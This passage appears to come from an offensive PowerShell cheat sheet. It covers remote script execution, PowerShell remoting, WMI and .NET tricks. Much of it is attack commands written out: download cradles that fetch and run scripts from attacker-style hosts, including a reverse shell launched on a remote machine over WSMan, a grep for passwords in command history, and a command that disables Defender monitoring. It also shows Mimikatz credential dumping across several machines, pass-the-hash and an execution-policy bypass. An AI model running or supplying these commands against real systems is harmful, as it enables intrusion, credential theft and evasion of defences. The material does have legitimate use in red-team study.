<li>All functions exposed by a module: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">Module</span> <span class="o">&lt;</span><span class="n">module_name</span><span class="o">&gt;</span></code></li>
</ul>
<h2 id="remote-script-execution">Remote Script execution<a class="headerlink" href="#remote-script-execution" title="Permanent link">&para;</a></h2>
<ul>
<li><code class="codehilite"><span class="nt">Invoke-Expression</span> <span class="o">(</span><span class="nt">New-Object</span> <span class="nt">Net</span><span class="p">.</span><span class="nc">WebClient</span><span class="o">)</span><span class="p">.</span><span class="nc">DownloadString</span><span class="o">(</span><span class="s1">&#39;http://example.com/example.ps1&#39;</span><span class="o">);</span></code></li>
<li><code class="codehilite"><span class="nt">iex</span> <span class="o">(</span><span class="nt">New-Object</span> <span class="nt">Net</span><span class="p">.</span><span class="nc">WebClient</span><span class="o">)</span><span class="p">.</span><span class="nc">DownloadString</span><span class="o">(</span><span class="s1">&#39;http://example.com/example.ps1&#39;</span><span class="o">);</span></code></li>
<li><code class="codehilite"><span class="n">powershell</span> <span class="o">-</span><span class="n">EncodedCommand</span> <span class="o">&lt;</span><span class="n">Base64EncodedCommand</span><span class="o">&gt;</span></code></li>
</ul>
<p><div class="codehilite"><pre><span></span><span class="nb">START </span><span class="p">/</span><span class="n">B</span> <span class="s2">&quot;&quot;</span> <span class="n">powershell</span> <span class="n">-c</span> <span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">Webclient</span><span class="p">).</span><span class="n">downloadstring</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.2/shell.ps1&#39;</span><span class="p">)</span>
</pre></div>
<em>/B prevents creation of a new window</em></p>
<ul>
<li>Craft Download Cradles: <a href="https://github.com/danielbohannon/Invoke-CradleCrafter">https://github.com/danielbohannon/Invoke-CradleCrafter</a></li>
</ul>
<p>More Download Cradles</p>
<ul>
<li><code class="codehilite"><span class="o">$</span><span class="nt">ie</span><span class="o">=</span><span class="nt">New-Object</span> <span class="nt">-ComObject</span> <span class="nt">InternetExplorer</span><span class="p">.</span><span class="nc">Application</span><span class="o">;$</span><span class="nt">ie</span><span class="p">.</span><span class="nc">visible</span><span class="o">=$</span><span class="nt">False</span><span class="o">;$</span><span class="nt">ie</span><span class="p">.</span><span class="nc">navigate</span><span class="o">(</span><span class="s1">&#39;http://example.com/example.ps1&#39;</span><span class="o">);</span><span class="nt">sleep</span> <span class="nt">5</span><span class="o">;$</span><span class="nt">resp</span><span class="o">=$</span><span class="nt">ie</span><span class="p">.</span><span class="nc">Document</span><span class="p">.</span><span class="nc">Body</span><span class="p">.</span><span class="nc">innerHTML</span><span class="o">;$</span><span class="nt">ie</span><span class="p">.</span><span class="nc">quit</span><span class="o">();</span><span class="nt">iex</span> <span class="o">$</span><span class="nt">resp</span></code></li>
<li><code class="codehilite"><span class="n">iex</span> <span class="p">(</span><span class="n">iwr</span> <span class="s1">&#39;http://example.com/example.ps1&#39;</span><span class="p">)</span></code></li>
<li>
<h2 id="hnew-object-comobject-msxm12xmlhttphopenget-http1921682301evilpsi1-falsehsendiex-h-responsetext"><code class="codehilite">$<span class="nv">h</span><span class="o">=</span><span class="nv">New</span><span class="o">-</span><span class="nv">Object</span> <span class="o">-</span><span class="nv">ComObject</span> <span class="nv">Msxm12</span>.<span class="nv">XMLHTTP</span><span class="c1">;$h.open(&#39;GET&#39;, &#39;http://192.168.230.1/evil.psi1&#39; ,$false);$h.send();iex $h. responseText</span></code><a class="headerlink" href="#hnew-object-comobject-msxm12xmlhttphopenget-http1921682301evilpsi1-falsehsendiex-h-responsetext" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="nv">$wr</span> <span class="no">[System.NET.WebRequest]</span><span class="p">::</span><span class="n">Create</span><span class="p">(</span><span class="s2">&quot;http://192.168.230.1/evil.psi&quot;</span><span class="p">)</span>
<span class="nv">$r</span> <span class="p">=</span> <span class="nv">$wr</span><span class="p">.</span><span class="n">GetResponse</span><span class="p">()</span>
<span class="nb">IEX </span><span class="p">(</span><span class="no">[System.IO.StreamReader]</span> <span class="p">(</span><span class="nv">$r</span><span class="p">.</span><span class="n">GetResponseStream</span><span class="p">()))</span> <span class="p">.</span><span class="n">ReadToEnd</span><span class="p">()```</span>
</pre></div></li>
</ul>
<h2 id="command-history-psreadline">Command History (PSReadline)<a class="headerlink" href="#command-history-psreadline" title="Permanent link">&para;</a></h2>
<p><div class="codehilite"><pre><span></span><span class="n">cat</span> <span class="p">(</span><span class="k">Get</span><span class="o">-</span><span class="n">PSReadlineOption</span><span class="p">).</span><span class="n">HistorySavePath</span> <span class="o">|</span> <span class="n">sls</span> <span class="n">password</span>
</pre></div>
By default, the path is:
<div class="codehilite"><pre><span></span><span class="n">profile</span><span class="p">:</span><span class="err">\</span><span class="n">AppData</span><span class="err">\</span><span class="n">Roaming</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">PowerShell</span><span class="err">\</span><span class="n">PSReadline</span><span class="err">\</span><span class="n">ConsoleHost_history</span><span class="p">.</span><span class="n">txt</span>
</pre></div></p>
<h2 id="powershell-remoting">Powershell Remoting<a class="headerlink" href="#powershell-remoting" title="Permanent link">&para;</a></h2>
<ul>
<li>Enabled by default from Windows Server 2012<ul>
<li><code class="codehilite"><span class="n">Enable</span><span class="o">-</span><span class="n">PSRemoting</span> <span class="o">-</span><span class="k">Force</span></code></li>
</ul>
</li>
<li>Admin privileges are required to connect</li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">CommandType</span> <span class="n">cmdlet</span> <span class="o">-</span><span class="n">ParameterName</span> <span class="n">computername</span></code></li>
<li><code class="codehilite"><span class="x">Get-Command -CommandType cmdlet | Where-Object </span><span class="cp">{</span><span class="nv">$_Parameters.Keys</span> <span class="o">--</span><span class="na">contains</span> <span class="s1">&#39;ComputerName&#39;</span> <span class="o">-</span><span class="na">and</span> <span class="nv">$_Parameters.Keys</span> <span class="o">--</span><span class="na">contains</span> <span class="s1">&#39;Credential&#39;</span> <span class="o">-</span><span class="na">and</span> <span class="nv">$_Parameters.Keys</span> <span class="o">--</span><span class="na">notcontains</span> <span class="s1">&#39;Session&#39;</span><span class="cp">}</span><span class="x"></span></code></li>
</ul>
<h3 id="wsman-webservicesmanagement-protocol-winrm">WSMAN (WebServicesManagement) Protocol (WinRM)<a class="headerlink" href="#wsman-webservicesmanagement-protocol-winrm" title="Permanent link">&para;</a></h3>
<ul>
<li>WinRM is Microsoft’s implementation of WSMAN</li>
<li>Port 5985, 5986</li>
<li>If target is in a workgroup, attacker's machine should trust target machine to send out credentials:<ul>
<li>Set-Item  WSMan:\localhost\client\trustedhosts -Value *</li>
</ul>
</li>
<li><code class="codehilite"><span class="x">Invoke-Command -ScriptBlock </span><span class="cp">{</span><span class="nv">$env</span><span class="o">:</span><span class="na">ComputerName</span><span class="cp">}</span><span class="x"> -ComputerName example -Credential dominName/userName</span></code><ul>
<li><code class="codehilite"><span class="o">-</span><span class="n">FilePath</span></code></li>
</ul>
</li>
</ul>
<div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">WSManAction</span> <span class="o">-</span><span class="n">Action</span> <span class="k">Create</span> <span class="o">-</span><span class="n">ResourceURI</span> <span class="n">wmicimv2</span><span class="o">/</span><span class="n">win32_process</span> <span class="o">-</span><span class="n">ValueSet</span> <span class="o">@</span><span class="err">{</span><span class="n">commandline</span><span class="o">=</span><span class="ss">&quot;powershell.exe -c Get-Process&quot;</span><span class="err">}</span> <span class="o">-</span> <span class="n">ComputerName</span> <span class="n">domainpc</span> <span class="err">–</span><span class="n">Credential</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">WSManAction</span> <span class="o">-</span><span class="n">Action</span> <span class="k">Create</span> <span class="o">-</span><span class="n">ResourceURI</span> <span class="n">wmicimv2</span><span class="o">/</span><span class="n">win32_process</span> <span class="o">-</span><span class="n">ValueSet</span> <span class="o">@</span><span class="err">{</span><span class="n">commandline</span><span class="o">=</span><span class="ss">&quot;powershell.exe -c iex ((New-Object Net.Webclient).DownloadString(&#39;http://192.168.254. 1/reverse_powershell.ps1&#39;))&quot;</span><span class="err">}</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="n">domainpc</span>
</pre></div>

<h2 id="wsman-vs-powershell-remoting-vs-wmi">WSMAN vs PowerShell Remoting vs WMI<a class="headerlink" href="#wsman-vs-powershell-remoting-vs-wmi" title="Permanent link">&para;</a></h2>
<p>WSMAN</p>
<ul>
<li>Firewall friendly</li>
<li>Use HTTP and HTTPS ports</li>
<li>Syntax is complex</li>
<li>Returns immutable objects</li>
<li>Can be used with non-Windows machines</li>
</ul>
<p>Powershell Remoting</p>
<ul>
<li>Firewall friendly</li>
<li>Easy use</li>
<li>Returns immutable objects</li>
</ul>
<p>WMI</p>
<ul>
<li>Not firewall friendly</li>
<li>Not NAT friendly</li>
<li>Complex</li>
<li>Returns editable objects</li>
</ul>
<h3 id="one-to-one">One to One<a class="headerlink" href="#one-to-one" title="Permanent link">&para;</a></h3>
<ul>
<li><code class="codehilite"><span class="n">Invoke</span><span class="o">-</span><span class="n">Command</span></code> is stateless for stageful operations use <code class="codehilite"><span class="n">PSSession</span></code><ul>
<li>Interactive, stateful session</li>
<li>Run in a new process <code class="codehilite"><span class="n">wsmprovhost</span></code></li>
</ul>
</li>
<li>New-PSSession<ul>
<li><code class="codehilite"><span class="err">$</span><span class="n">ses</span> <span class="o">=</span> <span class="k">New</span><span class="o">-</span><span class="n">PSSession</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Credential</span> <span class="o">&lt;</span><span class="n">cred</span><span class="o">&gt;</span></code></li>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">PSSession</span></code></li>
<li><code class="codehilite"><span class="n">Enter</span><span class="o">-</span><span class="n">PSSession</span></code></li>
</ul>
</li>
</ul>
<p>Define a function in a remote machine and call it:</p>
<div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">ScriptBlock</span> <span class="err">{</span><span class="k">function</span> <span class="n">Example1</span> <span class="err">{</span><span class="n">whoami</span><span class="p">;</span><span class="err">}}</span> <span class="o">-</span><span class="k">Session</span> <span class="err">$</span><span class="n">ses</span>
<span class="n">Invoke</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">ScriptBlock</span> <span class="err">{</span><span class="n">Example1</span><span class="err">}</span> <span class="o">-</span><span class="k">Session</span> <span class="err">$</span><span class="n">ses</span>
<span class="n">PSSession</span> <span class="o">-</span><span class="n">CommandName</span> <span class="n">Example1</span> <span class="o">-</span><span class="k">Session</span> <span class="err">$</span><span class="n">ses</span>
</pre></div>

<p>Export a command from a remote machine:</p>
<div class="codehilite"><pre><span></span><span class="n">Export</span><span class="o">-</span><span class="n">PSSession</span> <span class="o">-</span><span class="n">Module</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">CommandName</span> <span class="n">Example1</span> <span class="o">-</span><span class="k">Session</span> <span class="err">$</span><span class="n">ses</span>
</pre></div>

<p>Double Hop Problem (Attacker delegate sending token to target-2 from target-1)</p>
<p><img alt="image-20190615074509591" src="../_assets/image-20190615074509591.png" /></p>
<div class="codehilite"><pre><span></span><span class="n">Enable</span><span class="o">-</span><span class="n">WSManCredSSP</span> <span class="o">-</span><span class="k">Role</span> <span class="n">Client</span> <span class="o">-</span><span class="n">DelegateComputer</span>
<span class="n">Enable</span><span class="o">-</span><span class="n">WSManCredSSP</span> <span class="o">-</span><span class="k">Role</span> <span class="n">Server</span>
<span class="k">Get</span><span class="o">-</span><span class="n">WSManCredSSP</span>

<span class="n">Enter</span><span class="o">-</span><span class="n">PSSession</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Credential</span> <span class="o">&lt;</span><span class="n">cred</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Authentication</span> <span class="n">CredSSP</span>
</pre></div>

<h3 id="useful-cmdlets">Useful cmdlets<a class="headerlink" href="#useful-cmdlets" title="Permanent link">&para;</a></h3>
<p>New-PSSession
Enter-PSSession</p>
<div class="codehilite"><pre><span></span><span class="k">Set</span><span class="o">-</span><span class="n">MpPreference</span> <span class="o">-</span><span class="n">DisableRealtimeMonitoring</span> <span class="err">$</span><span class="k">true</span>
<span class="k">New</span><span class="o">-</span><span class="n">PSSession</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="n">instance</span>

<span class="err">$</span><span class="n">sess</span> <span class="o">=</span> <span class="k">New</span><span class="o">-</span><span class="n">PSSession</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="n">instance</span>
<span class="n">Enter</span><span class="o">-</span><span class="n">PSSEssion</span> <span class="o">-</span> <span class="k">Session</span> <span class="err">$</span><span class="n">sess</span>
</pre></div>

<h3 id="one-to-many-fan-out-remoting">One to Many (Fan-out Remoting)<a class="headerlink" href="#one-to-many-fan-out-remoting" title="Permanent link">&para;</a></h3>
<ul>
<li>Non-interactive</li>
<li>Parallel command execution</li>
<li>Can execute scripts from files</li>
<li>Usable to perform command execution without dropping exe onto disk</li>
<li>Useful for passing and replying hashes, tickets and other AD attacks</li>
</ul>
<p>Run commands:
<div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">ScriptBlock</span><span class="err">{</span><span class="n">whoami</span><span class="p">;</span><span class="n">hostname</span><span class="err">}</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="n">instance</span>
</pre></div></p>
<p>Run scripts:
<div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">FilePath</span> <span class="n">example</span><span class="p">.</span><span class="n">ps1</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="n">instance</span>
</pre></div></p>
<p>Run functions installed on the remote box:
<div class="codehilite"><pre><span></span>Invoke-Command -ScriptBlock <span class="cp">${</span><span class="n">function</span><span class="p">:</span><span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span><span class="cp">}</span> -ComputerName instance
</pre></div></p>
<p>Stateful commands:
<div class="codehilite"><pre><span></span><span class="x">$sess = New-PSSession -ComputerName instance</span>
<span class="x">Invoke-Command -Session $sess -ScriptBlock </span><span class="cp">{</span><span class="nv">$proc</span> <span class="o">=</span> <span class="na">Get</span><span class="o">-</span><span class="na">Process</span><span class="cp">}</span><span class="x"></span>
<span class="x">Invoke-Command -Session $sess -ScriptBlock </span><span class="cp">{</span><span class="nv">$proc.Name</span><span class="cp">}</span><span class="x"></span>
</pre></div></p>
<p>Mimikatz (ReflectivePEInjection is used to load into memory)
<div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">DumpCreds</span>
<span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">DumpCerts</span>
</pre></div></p>
<p>Pass the Hash
<div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">Command</span> <span class="s1">&#39;&quot;sekurlsa::pth /user:&lt;name_of_the_user&gt; /domain:. /ntlm:&lt;ntlmhash&gt; /run:powershell.exe&quot;&#39;</span>
</pre></div></p>
<div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">Command</span> <span class="s1">&#39;&quot;sekurlsa::pth /user:Administrator  /domain:. /ntlm:&lt;ntlmhash&gt; /run:powershell.exe&quot;&#39;</span>
</pre></div>

<p>Dump Creds from multiple machines
<div class="codehilite"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikatz</span> <span class="o">-</span><span class="n">DumpCreds</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="o">@</span><span class="p">(</span><span class="ss">&quot;instance1&quot;</span><span class="p">,</span> <span class="ss">&quot;instance2&quot;</span><span class="p">)</span>
</pre></div></p>
<h2 id="load-powerup">Load PowerUp<a class="headerlink" href="#load-powerup" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><span class="n">powershell</span> <span class="o">-</span><span class="n">ExecutionPolicy</span> <span class="n">Bypass</span>
<span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="p">.</span><span class="o">/</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
<span class="n">Invoke</span><span class="o">-</span><span class="n">AllChecks</span>
</pre></div>

<h2 id="active-directory">Active Directory<a class="headerlink" href="#active-directory" title="Permanent link">&para;</a></h2>
<ul>
<li>
<p>[ADSI]</p>
<ul>
<li>
<p>Get member of the domain admin group</p>
<div class="codehilite"><pre><span></span><span class="p">(</span><span class="o">[</span><span class="n">ADSI</span><span class="o">]</span><span class="ss">&quot;LDAP://cn=Domain Admin,cn=Users,dc=Example,dc=com&quot;</span><span class="p">).</span><span class="n">Members</span><span class="w"></span>
</pre></div>

</li>
</ul>
<ul>
<li>
<p>Get memberships of a user</p>
<div class="codehilite"><pre><span></span><span class="p">(</span><span class="o">[</span><span class="n">ADSI</span><span class="o">]</span><span class="ss">&quot;LDAP://cn=Administrator,cn=Users,dc=Example,dc=com&quot;</span><span class="p">).</span><span class="n">MemberOf</span><span class="w"></span>
</pre></div>

</li>
</ul>
</li>
</ul>
<ul>
<li>.NET Class: <code class="codehilite"><span class="k">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">ActiveDirectory</span></code></li>
</ul>
<ul>
<li>Native Executable</li>
</ul>
<ul>
<li>WMI</li>
</ul>
<h2 id="system-information">System Information<a class="headerlink" href="#system-information" title="Permanent link">&para;</a></h2>
<ul>
<li><code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">HotFix</span></code></li>
</ul>
<h2 id="jobs">Jobs<a class="headerlink" href="#jobs" title="Permanent link">&para;</a></h2>
<p><div class="codehilite"><pre><span></span><span class="k">Start</span><span class="o">-</span><span class="n">Job</span> <span class="o">-</span><span class="n">ScriptBlock</span> <span class="err">{</span><span class="n">whoami</span><span class="err">}</span>
<span class="k">Start</span><span class="o">-</span><span class="n">Job</span> <span class="o">-</span><span class="n">FilePath</span> <span class="o">&lt;</span><span class="n">path</span><span class="o">&gt;</span>

<span class="k">Get</span><span class="o">-</span><span class="n">Job</span> <span class="o">|</span> <span class="n">Receive</span><span class="o">-</span><span class="n">Job</span>
<span class="k">Get</span><span class="o">-</span><span class="n">Job</span> <span class="o">-</span><span class="n">id</span> <span class="o">&lt;</span><span class="n">id</span><span class="o">&gt;</span> <span class="o">|</span> <span class="n">Receive</span><span class="o">-</span><span class="n">Job</span>
<span class="n">Remove</span><span class="o">-</span><span class="n">Job</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="k">Get</span><span class="o">-</span><span class="n">Command</span> <span class="o">-</span><span class="n">ParameterName</span> <span class="n">AsJob</span>
</pre></div></p>
<p>Run job on a remote machine using <code class="codehilite"><span class="n">PSSession</span></code> or by using <code class="codehilite"><span class="o">-</span><span class="n">AsJob</span></code> with <code class="codehilite"><span class="o">-</span><span class="n">ComputerName</span></code>. With <code class="codehilite"><span class="o">-</span><span class="n">AsJob</span></code> it's possible to see remote jobs using <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Job</span></code>.</p>
<h2 id="net">.Net<a class="headerlink" href="#net" title="Permanent link">&para;</a></h2>
<h4 id="exploring-assemblies">Exploring Assemblies<a class="headerlink" href="#exploring-assemblies" title="Permanent link">&para;</a></h4>
<p>Finding assemblies</p>
<div class="codehilite"><pre><span></span><span class="err">$</span><span class="n">Classes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="n">AppDomain</span><span class="o">]::</span><span class="n">CurrentDomain</span><span class="p">.</span><span class="n">GetAssemblies</span><span class="p">()</span><span class="w"></span>
<span class="err">$</span><span class="n">Classes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="n">AppDomain</span><span class="o">]::</span><span class="n">CurrentDomain</span><span class="p">.</span><span class="n">GetAssemblies</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach</span><span class="o">-</span><span class="k">Object</span><span class="w"> </span><span class="err">{$</span><span class="n">_</span><span class="p">.</span><span class="n">GetTypes</span><span class="p">()</span><span class="err">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">Where</span><span class="o">-</span><span class="k">Object</span><span class="w"> </span><span class="err">{$</span><span class="n">_</span><span class="p">.</span><span class="n">IsPublic</span><span class="w"> </span><span class="o">-</span><span class="n">eq</span><span class="w"> </span><span class="ss">&quot;True&quot;</span><span class="err">}</span><span class="w"></span>
</pre></div>

<p>Working with assemblies and invoking functions</p>
<div class="codehilite"><pre><span></span><span class="x">$ProcClass = $Classes | Where-Object </span><span class="cp">{</span><span class="nv">$_.Name</span> <span class="o">-</span><span class="na">eq</span> <span class="s2">&quot;Proccess&quot;</span><span class="cp">}</span><span class="x"></span>
<span class="x">$ProcClass | Get-Members</span>
<span class="x">$ProcClass | Get-Members -MemberType Method -Static</span>
<span class="x">$ProcClass.GetMethods()</span>
<span class="x">$ProcClass::GetCurrentProcess()</span>
<span class="x">$ProcClass.FullName</span>

<span class="x">[System.Diagnostic.Process]::GetCurrentProcess()</span>

<span class="x">[System.Diagnostic.Process] | Get-Members -MemberType Method -Static | Format-List *</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="k">Add</span><span class="o">-</span><span class="k">Type</span> <span class="o">-</span><span class="n">AssemblyName</span> <span class="k">System</span><span class="p">.</span><span class="n">Windows</span><span class="p">.</span><span class="n">Forms</span>
<span class="p">[</span><span class="k">System</span><span class="p">.</span><span class="n">Windows</span><span class="p">.</span><span class="n">Forms</span><span class="p">.</span><span class="n">Sendkeys</span><span class="p">]</span>
</pre></div>

<h4 id="assemblyname">AssemblyName<a class="headerlink" href="#assemblyname" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><span class="k">Add</span><span class="o">-</span><span class="k">Type</span> <span class="o">-</span><span class="n">AssemblyName</span> <span class="k">System</span><span class="p">.</span><span class="n">ServiceProcess</span>
<span class="p">[</span><span class="k">System</span><span class="p">.</span><span class="n">ServiceProcess</span><span class="p">.</span><span class="n">ServiceController</span><span class="p">]</span> <span class="o">|</span> <span class="k">Get</span><span class="o">-</span><span class="n">Members</span> <span class="o">-</span><span class="n">MemberType</span> <span class="k">Method</span> <span class="o">-</span><span class="k">Static</span> <span class="o">|</span> <span class="n">Format</span><span class="o">-</span><span class="n">List</span> <span class="o">*</span>
<span class="p">[</span><span class="k">System</span><span class="p">.</span><span class="n">ServiceProcess</span><span class="p">.</span><span class="n">ServiceController</span><span class="p">]::</span><span class="n">GetDevices</span><span class="p">()</span>
</pre></div>

<h4 id="typedefinition">TypeDefinition<a class="headerlink" href="#typedefinition" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><span class="err">$</span><span class="n">DotnetCode</span> <span class="o">=</span> <span class="s">@&quot;</span>
<span class="n">public</span> <span class="k">class</span> <span class="n">SysCommands</span>

<span class="n">public</span> <span class="k">static</span> <span class="kt">void</span> <span class="nf">lookup</span> <span class="p">(</span><span class="n">string</span> <span class="n">domainname</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">System</span><span class="p">.</span> <span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="s">&quot;ns lookup.exe&quot;</span><span class="p">,</span> <span class="n">domainname</span><span class="p">)</span> <span class="p">;</span>
<span class="p">}</span>

<span class="n">public</span> <span class="kt">void</span> <span class="nf">netcmd</span> <span class="p">(</span><span class="n">string</span> <span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
 <span class="n">string</span> <span class="n">cmdstring</span> <span class="o">=</span> <span class="s">&quot;/k net.exe &quot;</span> <span class="o">+</span> <span class="n">cmd</span><span class="p">;</span>
 <span class="n">System</span><span class="p">.</span> <span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="s">&quot;cmd. exe&quot;</span> <span class="p">,</span><span class="n">cmdstring</span><span class="p">)</span> <span class="p">;</span>
<span class="p">}</span>

<span class="n">public</span> <span class="k">static</span> <span class="kt">void</span> <span class="nf">Main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">string</span> <span class="n">cmdstring</span> <span class="o">=</span> <span class="s">&quot;/k net.exe &quot;</span> <span class="o">+</span> <span class="s">&quot;user&quot;</span><span class="p">;</span>
  <span class="n">System</span><span class="p">.</span> <span class="n">Diagnostics</span><span class="p">.</span><span class="n">Process</span><span class="p">.</span><span class="n">Start</span><span class="p">(</span><span class="s">&quot;cmd. exe&quot;</span><span class="p">,</span><span class="n">cmdstring</span><span class="p">);</span>
<span class="p">}</span>
<span class="s">&quot;@</span>

<span class="cp"># Compile .Net code and load objects from it</span>
<span class="n">Add</span><span class="o">-</span><span class="n">Type</span> <span class="o">-</span><span class="n">TypeDefinition</span> <span class="err">$</span><span class="n">DotnetCode</span> <span class="o">-</span><span class="n">OutputType</span> <span class="n">Library</span> <span class="o">-</span><span class="n">OutputAssembly</span> <span class="n">SysCommand</span><span class="p">.</span><span class="n">dll</span>
<span class="n">Add</span><span class="o">-</span><span class="n">Type</span> <span class="o">-</span><span class="n">TypeDefinition</span> <span class="err">$</span><span class="n">DotnetCode</span> <span class="o">-</span><span class="n">OutputType</span> <span class="n">ConsoleApplication</span> <span class="o">-</span><span class="n">OutputAssembly</span> <span class="n">SysCommand</span><span class="p">.</span><span class="n">exe</span>
<span class="p">[</span><span class="n">SysCommand</span><span class="p">]</span><span class="o">::</span><span class="n">lookup</span><span class="p">(</span><span class="s">&quot;google.com&quot;</span><span class="p">)</span>

<span class="cp"># Load objects from a DLL into Memory</span>
<span class="err">$</span><span class="n">obj</span> <span class="o">=</span> <span class="n">Add</span><span class="o">-</span><span class="n">Type</span> <span class="o">-</span><span class="n">Path</span> <span class="n">SysCommand</span><span class="p">.</span><span class="n">dll</span> <span class="o">-</span><span class="n">PassThru</span>
<span class="err">$</span><span class="n">obj</span> <span class="o">|</span> <span class="n">Get</span><span class="o">-</span><span class="n">Members</span>
<span class="p">[</span><span class="n">SysCommand</span><span class="p">]</span><span class="o">::</span><span class="n">lookup</span><span class="p">(</span><span class="s">&quot;google.com&quot;</span><span class="p">)</span>

<span class="cp"># Calling non-static functions</span>
<span class="err">$</span><span class="n">obj</span> <span class="o">=</span> <span class="n">New</span><span class="o">-</span><span class="n">Object</span> <span class="n">SysCommands</span>
<span class="err">$</span><span class="n">obj</span> <span class="p">.</span><span class="n">netcmd</span><span class="p">(</span><span class="s">&quot;user&quot;</span><span class="p">)</span><span class="err">#</span><span class="o">&gt;</span>
</pre></div>

<h4 id="memberdefinition-dll-import">MemberDefinition - DLL Import<a class="headerlink" href="#memberdefinition-dll-import" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><span class="err">$</span><span class="n">Apicode</span> <span class="o">=</span> <span class="s">@&quot;</span>

<span class="p">[</span><span class="n">DllImport</span><span class="p">(</span><span class="s">&quot;kerne132.d11&quot;</span><span class="p">)]</span>
<span class="n">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="n">CreateSymbolicLink</span><span class="p">(</span><span class="n">string</span> <span class="n">IpSymlinkFileName</span><span class="p">,</span> <span class="n">string</span> <span class="n">IpTargetFileName</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dwFlags</span><span class="p">);</span>

<span class="s">&quot;@</span>

<span class="err">$</span><span class="n">SymLink</span> <span class="o">=</span> <span class="n">Add</span><span class="o">-</span><span class="n">Type</span> <span class="o">-</span><span class="n">MemberDefinition</span> <span class="err">$</span><span class="n">ApiCode</span> <span class="o">-</span><span class="n">Name</span> <span class="n">Symlink</span> <span class="o">-</span><span class="n">Namespace</span> <span class="n">CreatSymLink</span> <span class="o">-</span><span class="n">PassThru</span>
<span class="err">$</span><span class="n">SymLink</span><span class="o">::</span><span class="n">CreateSymbolicLink</span><span class="p">(</span><span class="err">&#39;</span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">test</span><span class="err">\</span><span class="n">link</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
</pre></div>

<h2 id="wmi">WMI<a class="headerlink" href="#wmi" title="Permanent link">&para;</a></h2>
<p>Exploring namespaces</p>
<div class="codehilite"><pre><span></span><span class="k">Get</span><span class="o">-</span><span class="n">WmiObject</span> <span class="o">-</span><span class="n">Namespace</span> <span class="ss">&quot;root&quot;</span> <span class="o">-</span><span class="k">Class</span> <span class="ss">&quot;__Namespace&quot;</span> <span class="o">|</span> <span class="k">select</span> <span class="n">name</span>
</pre></div>

<p>List even the nested namespaces -</p>
<p><a href="http://www.powershellmagazine.com/2013/10/18/pstip-list-all-wmi-namespaces-on-a-system/">http://www.powershellmagazine.com/2013/10/18/pstip-list-all-wmi-namespaces-on-a-system/</a></p>
